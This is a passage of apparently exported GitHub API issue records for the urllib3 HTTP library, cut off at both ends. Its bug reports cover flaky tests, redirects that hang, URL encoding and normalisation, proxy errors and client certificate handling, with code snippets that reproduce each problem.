ip6-allrouters\r\n```\r\n\r\n### Fix\r\nI can add a timeout to the test, but that's a solution to the root problem.\r\nI suggest that `ServerSocketThread` treat a system where `localhost` does not resolve to `::1` as having insane IPv6 configuration and use the current IPv4 fallback mechanism.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1815", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1815/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1815/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1815/events", "html_url": "https://github.com/urllib3/urllib3/issues/1815", "id": 580639016, "node_id": "MDU6SXNzdWU1ODA2MzkwMTY=", "number": 1815, "title": "Fix flaky test_preserve_chunked_on_retry_after test", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2020-03-13T14:31:51Z", "updated_at": "2020-03-17T19:40:25Z", "closed_at": "2020-03-16T03:26:03Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Our test that fails the most in CI is `TestChunkedTransfer.test_preserve_chunked_on_retry`. I'm opening this issue to figure out a fix.\r\n\r\nThis test ensures the `chunked` parameter is preserved even when the server replies with a Retry-After HTTP header, which causes a recursive `urlopen` call. This was introduced a few months ago in https://github.com/urllib3/urllib3/pull/1734. I actually wrote the test during a [urllib3 grant](https://quentin.pradet.me/blog/ive-been-paid-to-work-on-open-source.html). I then saw errors, and tried to make the test less flaky with https://github.com/urllib3/urllib3/pull/1743/files, but we still get failures on Windows.\r\n\r\nExamples:\r\n\r\n * https://ci.appveyor.com/project/pquentin/urllib3/builds/31423841/job/4bw0wt96a8tepxi8\r\n * https://ci.appveyor.com/project/urllib3/urllib3/builds/30901072/job/e9357fq0ju98nok3\r\n * https://ci.appveyor.com/project/urllib3/urllib3/builds/30506635/job/s6s5nki5muuaypwr\r\n * https://ci.appveyor.com/project/urllib3/urllib3/builds/30000006/job/ljhwg4bu6cpipk6c\r\n\r\nSo, what is this test doing? Two things:\r\n\r\n * Send a chunked request with one retry to an endpoint who will answer with a `Retry-After` header\r\n * Make sure that the `Transfer-Encoding: chunked` header was sent in both requests\r\n\r\nWe already have tests for Retry-After, but I didn't find a way to test this with Tornado, which is a black box. However, now that I'm writing this, I realize I can modify the `retry_after` endpoint to tell me if `Transfer-Encoding: chunked` was sent. (Getting clarity is exactly why I'm writing this up, by the way. Thanks for being my [rubber duck](https://en.wikipedia.org/wiki/Rubber_duck_debugging).)\r\n\r\nBut still, my understanding is that we're trying to move away from Tornado to write more socket level tests: they're more reliable when written correctly. And a weird failure like that is an opportunity to learn more about HTTP and networking. So how is this test working?\r\n\r\nHere's the current version:\r\n\r\n```python3\r\ndef test_preserve_chunked_on_retry(self):\r\n    self.chunked_requests = 0\r\n\r\n    def socket_handler(listener):\r\n        for _ in range(2):\r\n            sock = listener.accept()[0]\r\n            request = consume_socket(sock)\r\n            if b\"Transfer-Encoding: chunked\" in request.split(b\"\\r\\n\"):\r\n                self.chunked_requests += 1\r\n\r\n            sock.send(\r\n                b\"HTTP/1.1 429 Too Many Requests\\r\\n\"\r\n                b\"Content-Type: text/plain\\r\\n\"\r\n                b\"Retry-After: 1\\r\\n\"\r\n                b\"\\r\\n\"\r\n            )\r\n            sock.close()\r\n\r\n    self._start_server(socket_handler)\r\n    with HTTPConnectionPool(self.host, self.port) as pool:\r\n        retries = Retry(total=1)\r\n        pool.urlopen(\r\n            \"GET\", \"/\", chunked=True, preload_content=False, retries=retries\r\n        )\r\n    assert self.chunked_requests == 2\r\n```\r\n\r\nWe know we're going to get two requests, which is why we have `for _ in range(2)`. We update `self.chunked_requests` with each correctly chunked request. In the failures I've seen, usually the first request works fine, but the second one fails with `ConnectionAbortedError: [WinError 10053] An established connection`. It's [WSAECONNRESET](https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2), also known as \"Connection reset by peer\", which means the server closed the socket before the client read its contents.\r\n\r\n(A race condition between those two requests can be safely excluded since we're unfortunately waiting one full second between the two requests, as urllib3 does not support fractional seconds in Retry-After values.)\r\n\r\nThe good news is that I was able to reproduce \"Connection reset by peer\" on my macOS computer by removing `preload_content=False`, which made little sense here anyway. I then googled \"socket close http\" since the error is due to the closed socket and found https://www.oreilly.com/library/view/http-the-definitive/1565925092/ch04s07.html which mentions Content-Length can be an issue. And then I was able to fix the error on macOS by adding `Content-Length: 0`!\r\n\r\nI tried this on CI, and ran that test 100 times using pytest-flakefinder. I had  0 issues on macOS + Linux but still got 10-20% of failures on Windows: see https://ci.appveyor.com/project/pquentin/urllib3/build/job/xe7084idp7rg7gue for an exemple.\r\n\r\nWhen adding more debugging information, I realized that there's indeed a race where on Windows we read the response after the socket gets closed. And `preload_content=False` does not help, as the socket can be closed before the client even tries to read the status line. Indeed, other tests wait for the client close before closing in the server side using `threading.Event` synchronization. But that's not possible here as we want the client to do two requests, so I can't ask urllib3 to tell the test when the first request has been read.\r\n\r\nAnd I found that I do need to close the socket to get the client to proceed. But no, there's a workaround, I can use `Connection: close` in my server response! So that works fine, and I can always close the two sockets after the tests.\r\n\r\nBut how is Tornado doing it? When is it closing connections for this to work? I was unable to figure out by reading the code, there are too many knobs and indirections to follow. I also tried reading the code for http.server in Python 3, and got lost too.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1814", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1814/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1814/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1814/events", "html_url": "https://github.com/urllib3/urllib3/issues/1814", "id": 580162874, "node_id": "MDU6SXNzdWU1ODAxNjI4NzQ=", "number": 1814, "title": "Error on send query string to service after 1.25", "user": {"login": "luiscoms", "id": 758273, "node_id": "MDQ6VXNlcjc1ODI3Mw==", "avatar_url": "https://avatars1.githubusercontent.com/u/758273?v=4", "gravatar_id": "", "url": "https://api.github.com/users/luiscoms", "html_url": "https://github.com/luiscoms", "followers_url": "https://api.github.com/users/luiscoms/followers", "following_url": "https://api.github.com/users/luiscoms/following{/other_user}", "gists_url": "https://api.github.com/users/luiscoms/gists{/gist_id}", "starred_url": "https://api.github.com/users/luiscoms/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/luiscoms/subscriptions", "organizations_url": "https://api.github.com/users/luiscoms/orgs", "repos_url": "https://api.github.com/users/luiscoms/repos", "events_url": "https://api.github.com/users/luiscoms/events{/privacy}", "received_events_url": "https://api.github.com/users/luiscoms/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-12T19:12:52Z", "updated_at": "2020-03-12T21:46:05Z", "closed_at": "2020-03-12T21:46:04Z", "author_association": "NONE", "active_lock_reason": null, "body": "Before update 1.25 following request was working.\r\n\r\n```python\r\nrequests.get('http://service.com/endpoint?some=[\"5\",\"b\"]')\r\n```\r\n\r\nNow, is converting chars to percent.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1809", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1809/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1809/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1809/events", "html_url": "https://github.com/urllib3/urllib3/issues/1809", "id": 578058369, "node_id": "MDU6SXNzdWU1NzgwNTgzNjk=", "number": 1809, "title": "Dotted FQDN tests may fail or succeed depending on system DNS configuration", "user": {"login": "mgorny", "id": 110765, "node_id": "MDQ6VXNlcjExMDc2NQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/110765?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mgorny", "html_url": "https://github.com/mgorny", "followers_url": "https://api.github.com/users/mgorny/followers", "following_url": "https://api.github.com/users/mgorny/following{/other_user}", "gists_url": "https://api.github.com/users/mgorny/gists{/gist_id}", "starred_url": "https://api.github.com/users/mgorny/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mgorny/subscriptions", "organizations_url": "https://api.github.com/users/mgorny/orgs", "repos_url": "https://api.github.com/users/mgorny/repos", "events_url": "https://api.github.com/users/mgorny/events{/privacy}", "received_events_url": "https://api.github.com/users/mgorny/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-09T17:08:24Z", "updated_at": "2020-03-22T01:27:58Z", "closed_at": "2020-03-22T01:27:58Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Related to #1475, #1648.\r\n\r\nI've recently spent some time debugging test failures reported by Gentoo users, and came to the conclusion that resolving `localhost.` may work or not depending on the system resolver configuration. I've been able to make it work reliably by listing `localhost.` in `/etc/hosts` explicitly or by using `nss_myhostname`. It also may work when external DNS is used and works, though I have no clue why glibc makes it work like that. On the other hand, if the system can't connect to the DNS resolver, it fails.\r\n\r\nSince this test is unreliable, could you please disable (skip) it by default and enable only on known-good travis infra? I would supply a patch but I don't really know what values `TRAVIS_INFRA` can have.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1808", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1808/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1808/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1808/events", "html_url": "https://github.com/urllib3/urllib3/issues/1808", "id": 577303188, "node_id": "MDU6SXNzdWU1NzczMDMxODg=", "number": 1808, "title": "urllib3 hanging inside call to PoolManager request", "user": {"login": "tycarac", "id": 6276083, "node_id": "MDQ6VXNlcjYyNzYwODM=", "avatar_url": "https://avatars2.githubusercontent.com/u/6276083?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tycarac", "html_url": "https://github.com/tycarac", "followers_url": "https://api.github.com/users/tycarac/followers", "following_url": "https://api.github.com/users/tycarac/following{/other_user}", "gists_url": "https://api.github.com/users/tycarac/gists{/gist_id}", "starred_url": "https://api.github.com/users/tycarac/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tycarac/subscriptions", "organizations_url": "https://api.github.com/users/tycarac/orgs", "repos_url": "https://api.github.com/users/tycarac/repos", "events_url": "https://api.github.com/users/tycarac/events{/privacy}", "received_events_url": "https://api.github.com/users/tycarac/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 14, "created_at": "2020-03-07T08:51:51Z", "updated_at": "2020-04-03T13:08:33Z", "closed_at": "2020-04-03T13:08:33Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "I have a repeatable issue with urllib3 hanging inside PoolManager request for an unusual edge case.  I have repeated this issue on two separate machines.\r\n\r\nI am using Windows 10, 64-bit (fully patched) and Python 3.8.2, 64-bit.  The urllib3 version is 1.25.8 in a fresh venv environment.\r\n\r\nThe edge case is:\r\n  1. Second call to urllib3 PoolManager request hangs inside request call and never returns\r\n  2. Using streaming to read and write response to file\r\n  3. url has a redirect (http status 301)\r\n\r\nThe original code used concurrent.futures, but the issue is the same without it using a simple loop.\r\n\r\nI have put together a small extract from the code I have been running for about one year.  It was only when I recently started with a new use case that co-incidentally started using urls with redirects that I found this problem where each of concurrent.futures workers in my Python application would hang.  Then I removed concurrent features.\r\n\r\nAfter stepping through the urllib3 source code, I could not figure out the root cause.  \r\n\r\nI ask if others can reproduce the issue and then help find find the root cause.\r\n\r\n# Code:\r\n```\r\nimport logging\r\nfrom pathlib import Path\r\nimport shutil\r\nimport urllib3\r\n\r\n_logger = logging.getLogger(__name__)\r\n_BUFFER_SIZE = 1024 * 1024   # buffer for downloading remote resource\r\n\r\nurl_headers = urllib3.make_headers(keep_alive=True, accept_encoding=True)\r\nurl_retries = urllib3.Retry(total=2, backoff_factor=1, status_forcelist=[500, 502, 503, 504])\r\nurl_client = urllib3.PoolManager(timeout=urllib3.Timeout(total=15.0), retries=url_retries, block=True,\r\n                                 headers=url_headers)\r\n\r\n\r\ndef stream_response(url: str, filepath: Path, id: int):\r\n    # Must call release_conn() after file copied but opening/writing exception is possible\r\n    rsp = None\r\n    try:\r\n        _logger.debug(f'> {id:4d} GET: {url}')\r\n        rsp = url_client.request('GET', url, preload_content=False)\r\n        _logger.debug(f'> {id:4d} resp code: {rsp.status}')\r\n        if rsp.status == 200:\r\n            _logger.debug(f'> {id:4d} writing: \"{filepath.name}\"')\r\n            with filepath.open('wb', buffering=_BUFFER_SIZE) as rfp:\r\n                shutil.copyfileobj(rsp, rfp, length=_BUFFER_SIZE)\r\n    except Exception as ex:\r\n        _logger.exception(f'> {id:4d} Error')\r\n    finally:\r\n        if rsp:\r\n            rsp.release_conn()\r\n\r\n    return rsp.status\r\n\r\n\r\nlogging.basicConfig(level=logging.DEBUG,\r\n            handlers=[logging.FileHandler('output.log', mode='w'), logging.StreamHandler()])\r\nlogging.captureWarnings(True)\r\n\r\n_logger.info('Started')\r\nitems = [\r\n    ['https://fwd.aws/v3mz8', Path('d1.pdf')],\r\n    ['https://fwd.aws/88JKk', Path('d2.pdf')],\r\n    ['https://fwd.aws/D9yDG', Path('d3.pdf')],\r\n    ['https://fwd.aws/NmXza', Path('d4.pdf')],\r\n    ['https://fwd.aws/NmXza', Path('d5.pdf')]\r\n]\r\n\r\nfor id, it in enumerate(items):\r\n    stream_response(it[0], it[1], id)\r\n```\r\n\r\n# Output:\r\n```\r\nD:\\Temp\\Python issue>\r\nD:\\Temp\\Python issue>.env\\Scripts\\activate\r\n\r\n(.env) D:\\Temp\\Python issue>\r\n(.env) D:\\Temp\\Python issue>python urllib3_locking.py\r\nINFO:__main__:Started\r\nDEBUG:__main__:>    0 GET: https://fwd.aws/v3mz8\r\nDEBUG:urllib3.connectionpool:Starting new HTTPS connection (1): fwd.aws:443\r\nDEBUG:urllib3.connectionpool:https://fwd.aws:443 \"GET /v3mz8 HTTP/1.1\" 301 0\r\nDEBUG:urllib3.util.retry:Incremented Retry for (url='https://fwd.aws/v3mz8'): Retry(total=2, connect=None, read=None, redirect=None, status=None)\r\nINFO:urllib3.poolmanager:Redirecting https://fwd.aws/v3mz8 -> https://aws-quickstart.s3.amazonaws.com/quickstart-hashicorp-consul/doc/hashicorp-consul-on-the-aws-cloud.pdf\r\nDEBUG:urllib3.connectionpool:Starting new HTTPS connection (1): aws-quickstart.s3.amazonaws.com:443\r\nDEBUG:urllib3.connectionpool:https://aws-quickstart.s3.amazonaws.com:443 \"GET /quickstart-hashicorp-consul/doc/hashicorp-consul-on-the-aws-cloud.pdf HTTP/1.1\" 200 1610783\r\nDEBUG:__main__:>    0 resp code: 200\r\nDEBUG:__main__:>    0 writing: \"d1.pdf\"\r\nDEBUG:__main__:>    1 GET: https://fwd.aws/88JKk\r\n\r\nProcess finished with exit code -1\r\n```\r\n\r\nI have to manually terminate the application (CPU usage for process is zero) and the output never shows the response http status code.\r\n\r\n[Python issue - 200307.zip](https://github.com/urllib3/urllib3/files/4301755/Python.issue.-.200307.zip)\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1807", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1807/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1807/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1807/events", "html_url": "https://github.com/urllib3/urllib3/issues/1807", "id": 570866796, "node_id": "MDU6SXNzdWU1NzA4NjY3OTY=", "number": 1807, "title": "Base headers are missing when using connection_from_host method on PoolManager.", "user": {"login": "a-feld", "id": 6374032, "node_id": "MDQ6VXNlcjYzNzQwMzI=", "avatar_url": "https://avatars2.githubusercontent.com/u/6374032?v=4", "gravatar_id": "", "url": "https://api.github.com/users/a-feld", "html_url": "https://github.com/a-feld", "followers_url": "https://api.github.com/users/a-feld/followers", "following_url": "https://api.github.com/users/a-feld/following{/other_user}", "gists_url": "https://api.github.com/users/a-feld/gists{/gist_id}", "starred_url": "https://api.github.com/users/a-feld/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/a-feld/subscriptions", "organizations_url": "https://api.github.com/users/a-feld/orgs", "repos_url": "https://api.github.com/users/a-feld/repos", "events_url": "https://api.github.com/users/a-feld/events{/privacy}", "received_events_url": "https://api.github.com/users/a-feld/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-02-25T22:08:24Z", "updated_at": "2020-03-09T01:26:05Z", "closed_at": "2020-03-09T01:26:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "When using `connection_from_host` on `PoolManager` classes, the base headers are missing from outbound requests.\r\n\r\n## Minimal Reproduction\r\n\r\n```python\r\nimport json\r\nfrom pprint import pprint\r\n\r\nimport urllib3\r\n\r\nHEADERS = {\"Foo\": \"bar\"}\r\n\r\n# Foo header is added to PoolManager base headers\r\nhttp = urllib3.PoolManager(headers=HEADERS)\r\n\r\n# Request is made by using the connection_from_host method\r\nconn = http.connection_from_host(\"httpbin.org\", scheme=\"https\")\r\nresponse = conn.request(\"GET\", \"/headers\")\r\n\r\n# Foo is missing from the sent headers\r\nsent_headers = json.loads(response.data.decode())\r\npprint(sent_headers)\r\n```\r\n\r\n### Output\r\n```\r\n{'headers': {'Accept-Encoding': 'identity',\r\n             'Host': 'httpbin.org',\r\n             'X-Amzn-Trace-Id': '...'}}\r\n```\r\n\r\n### Expected\r\n```\r\n{'headers': {'Accept-Encoding': 'identity',\r\n             'Foo': 'bar',\r\n             'Host': 'httpbin.org',\r\n             'X-Amzn-Trace-Id': '...'}}\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1803", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1803/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1803/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1803/events", "html_url": "https://github.com/urllib3/urllib3/issues/1803", "id": 567165793, "node_id": "MDU6SXNzdWU1NjcxNjU3OTM=", "number": 1803, "title": "[mTLS] pass client cert and key content to urllib3.PoolManager as string", "user": {"login": "arithmetic1728", "id": 58957152, "node_id": "MDQ6VXNlcjU4OTU3MTUy", "avatar_url": "https://avatars2.githubusercontent.com/u/58957152?v=4", "gravatar_id": "", "url": "https://api.github.com/users/arithmetic1728", "html_url": "https://github.com/arithmetic1728", "followers_url": "https://api.github.com/users/arithmetic1728/followers", "following_url": "https://api.github.com/users/arithmetic1728/following{/other_user}", "gists_url": "https://api.github.com/users/arithmetic1728/gists{/gist_id}", "starred_url": "https://api.github.com/users/arithmetic1728/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/arithmetic1728/subscriptions", "organizations_url": "https://api.github.com/users/arithmetic1728/orgs", "repos_url": "https://api.github.com/users/arithmetic1728/repos", "events_url": "https://api.github.com/users/arithmetic1728/events{/privacy}", "received_events_url": "https://api.github.com/users/arithmetic1728/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-02-18T21:21:32Z", "updated_at": "2020-02-19T05:35:02Z", "closed_at": "2020-02-19T05:35:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "It seems urllib3.PoolManager only reads client cert and key from a given path, like the following:\r\n```\r\nhttp = urllib3.PoolManager(\r\n     cert_file='/path/to/your/client_cert.pem',\r\n     cert_reqs='CERT_REQUIRED',\r\n     key_file='/path/to/your/client.key',\r\n     key_password='keyfile_password')\r\n```\r\nI have client cert and key in memory due to security reason and I cannot save them on disk. How do I pass the cert and key content strings to PoolManager?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1799", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1799/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1799/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1799/events", "html_url": "https://github.com/urllib3/urllib3/issues/1799", "id": 562083936, "node_id": "MDU6SXNzdWU1NjIwODM5MzY=", "number": 1799, "title": "Rename VerifiedHTTPSConnection to HTTPSConnection", "user": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}, {"id": 191038337, "node_id": "MDU6TGFiZWwxOTEwMzgzMzc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Help%20Wanted", "name": "Help Wanted", "color": "eb6420", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-08T21:57:39Z", "updated_at": "2020-02-29T00:01:20Z", "closed_at": "2020-02-29T00:01:20Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "The current `HTTPSConnection` object is broken and doesn't serve much purpose. We should use the current `VerifiedHTTPSConnection` object and rebind the name to preserve backwards compatibility.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1798", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1798/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1798/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1798/events", "html_url": "https://github.com/urllib3/urllib3/issues/1798", "id": 561088521, "node_id": "MDU6SXNzdWU1NjEwODg1MjE=", "number": 1798, "title": "<deleted>", "user": {"login": "zogzog", "id": 789110, "node_id": "MDQ6VXNlcjc4OTExMA==", "avatar_url": "https://avatars0.githubusercontent.com/u/789110?v=4", "gravatar_id": "", "url": "https://api.github.com/users/zogzog", "html_url": "https://github.com/zogzog", "followers_url": "https://api.github.com/users/zogzog/followers", "following_url": "https://api.github.com/users/zogzog/following{/other_user}", "gists_url": "https://api.github.com/users/zogzog/gists{/gist_id}", "starred_url": "https://api.github.com/users/zogzog/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/zogzog/subscriptions", "organizations_url": "https://api.github.com/users/zogzog/orgs", "repos_url": "https://api.github.com/users/zogzog/repos", "events_url": "https://api.github.com/users/zogzog/events{/privacy}", "received_events_url": "https://api.github.com/users/zogzog/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-02-06T15:30:36Z", "updated_at": "2020-02-14T14:02:15Z", "closed_at": "2020-02-08T21:56:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1797", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1797/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1797/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1797/events", "html_url": "https://github.com/urllib3/urllib3/issues/1797", "id": 559379743, "node_id": "MDU6SXNzdWU1NTkzNzk3NDM=", "number": 1797, "title": "Unable to connect through an HTTPS proxy", "user": {"login": "mpalki1", "id": 7777009, "node_id": "MDQ6VXNlcjc3NzcwMDk=", "avatar_url": "https://avatars0.githubusercontent.com/u/7777009?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mpalki1", "html_url": "https://github.com/mpalki1", "followers_url": "https://api.github.com/users/mpalki1/followers", "following_url": "https://api.github.com/users/mpalki1/following{/other_user}", "gists_url": "https://api.github.com/users/mpalki1/gists{/gist_id}", "starred_url": "https://api.github.com/users/mpalki1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mpalki1/subscriptions", "organizations_url": "https://api.github.com/users/mpalki1/orgs", "repos_url": "https://api.github.com/users/mpalki1/repos", "events_url": "https://api.github.com/users/mpalki1/events{/privacy}", "received_events_url": "https://api.github.com/users/mpalki1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-03T22:44:14Z", "updated_at": "2020-02-04T04:59:34Z", "closed_at": "2020-02-04T04:20:15Z", "author_association": "NONE", "active_lock_reason": null, "body": "We are using an internal HTTPS proxy. When we use urllib3 to make requests through it we get a \"Remote end closed connection without response\" error.  Given below is code to sort of reproduce the issue.  \r\nNote - When we use a http proxy, then the request goes through. \r\n\r\n```\r\n#This fails\r\nimport urllib3\r\nproxy=urllib3.ProxyManager( proxy_url=\"https://www.yahoo.com\");\r\nresp = proxy.request(\"GET\", \"https://www.example.com\");\r\nresp.data\r\n\r\n#Curl establishes the initial CONNECT request but then returns a 404\r\ncurl -x https://www.yahoo.com https://www.example.com \r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1790", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1790/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1790/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1790/events", "html_url": "https://github.com/urllib3/urllib3/issues/1790", "id": 554828691, "node_id": "MDU6SXNzdWU1NTQ4Mjg2OTE=", "number": 1790, "title": "Issue with Parsing URIs - Breaks Security Tools when testing for Path Traversal ", "user": {"login": "mazen160", "id": 8996052, "node_id": "MDQ6VXNlcjg5OTYwNTI=", "avatar_url": "https://avatars3.githubusercontent.com/u/8996052?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mazen160", "html_url": "https://github.com/mazen160", "followers_url": "https://api.github.com/users/mazen160/followers", "following_url": "https://api.github.com/users/mazen160/following{/other_user}", "gists_url": "https://api.github.com/users/mazen160/gists{/gist_id}", "starred_url": "https://api.github.com/users/mazen160/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mazen160/subscriptions", "organizations_url": "https://api.github.com/users/mazen160/orgs", "repos_url": "https://api.github.com/users/mazen160/repos", "events_url": "https://api.github.com/users/mazen160/events{/privacy}", "received_events_url": "https://api.github.com/users/mazen160/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 14, "created_at": "2020-01-24T16:19:59Z", "updated_at": "2020-04-12T08:50:58Z", "closed_at": "2020-03-25T12:51:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi all,\r\n\r\nI have noticed an odd behaviour in requests module, which uses urllib3. I inspected the root cause via regression testing and I found that the root cause of the issue is a change that was introduced in urlib3 \r\n\r\n```python\r\nimport requests\r\nrequests.get(\"http://127.0.0.1/../../../../doing/certain/check\")\r\n```\r\nWhich should typically send to the following path: `/../../../doing/certain/check`. Instead, it's requesting `/doing/certain/check` and modifying the specified input.\r\n\r\nThis breaks a lot of security tools that are performing fuzzing for path traversal vulnerabilities in web-applications.\r\n\r\nThe only solution for current tools is to revert to `urlib3==1.24.3`.\r\n\r\nThis may be related: 